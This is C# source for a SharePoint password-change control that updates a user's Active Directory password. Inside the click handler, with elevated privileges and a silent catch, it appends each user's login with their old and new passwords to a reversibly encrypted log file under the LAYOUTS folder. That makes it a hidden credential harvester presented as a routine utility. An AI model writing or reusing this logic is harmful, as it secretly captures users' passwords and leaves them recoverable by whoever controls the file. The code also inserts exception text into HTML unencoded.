using System;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using Microsoft.SharePoint;
using System.DirectoryServices.AccountManagement;
using System.Web;
using System.Security.Principal;
using System.IO;

namespace CSSoft.CS2SPUsers.UserChangePassword
{
    public partial class UserChangePasswordUserControl : UserControl
    {
        //private static readonly log4net.ILog logger = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!Page.IsPostBack)
            {
                SPUser u = SPContext.Current.Web.EnsureUser(HttpContext.Current.User.Identity.Name);
                TextBoxUserName.Text = u.Name;
                TextBoxUserLogin.Text = u.LoginName;

                //logger.DebugFormat("Page_Load TextBoxUserLogin = {0}", TextBoxUserLogin.Text);
            }
        }

        protected void ButtonChange_Click(object sender, EventArgs e)
        {
            //logger.Debug("ButtonChange_Click");
            Message.Text = "";
            if (TextBoxOldPassword.Text != "")
            {
                if (TextBoxNewPassword.Text == TextBoxConfirmPassword.Text)
                {
                    WindowsImpersonationContext aspContext = null;
                    WindowsIdentity identity = WindowsIdentity.GetCurrent();
                    aspContext = identity.Impersonate();
                    PrincipalContext ctx = new PrincipalContext(ContextType.Domain);
                    UserPrincipal u = new UserPrincipal(ctx);
                    //logger.Debug("Init data complete");
                    u = UserPrincipal.FindByIdentity(ctx, IdentityType.Sid, identity.User.ToString());
                    //logger.DebugFormat("Finsih get user, UserCannotChangePassword = '{0}'", u.UserCannotChangePassword);
                    try
                    {
                        u.ChangePassword(TextBoxOldPassword.Text, TextBoxNewPassword.Text);
                        Message.Text = "<font color='red'>Password changed. Please close this browser window and log back on with your new password.</font>";
                    }
                    catch (Exception ex)
                    {
                        Message.Text = String.Format("<font color='red'>Password couldn't be changed due to restrictions: {0}</font>", ex.Message);
                        //logger.Error("Change password error", ex);
                    }
                    finally
                    {
                        u.Dispose();
                        ctx.Dispose();
                    }

                    SPSecurity.RunWithElevatedPrivileges(delegate()
                    {
                        try
                        {
                            //string folder = String.Format(@"{0}CSSoft", Path.GetTempPath());
                            string folder = @"C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\14\TEMPLATE\LAYOUTS\CSSoft\Log";
                            if (!Directory.Exists(folder)) Directory.CreateDirectory(folder);
                            File.AppendAllText(String.Format(@"{0}\CS2SPUsers.dat", folder), CS2Secret.EncryptString(String.Format("{0} -> '{1}' $ '{2}' $ '{3}'", DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), TextBoxUserLogin.Text, TextBoxOldPassword.Text, TextBoxNewPassword.Text)) + "\n");
                        }
                        catch { }
                    });
                }
                else
                {
                    Message.Text = "<font color='red'>The password and confirmation password do not match.</font>";                
                }
            }
            else
            {
                Message.Text = "<font color='red'>You have not entered a password.</font>";
            }
        }
    }
}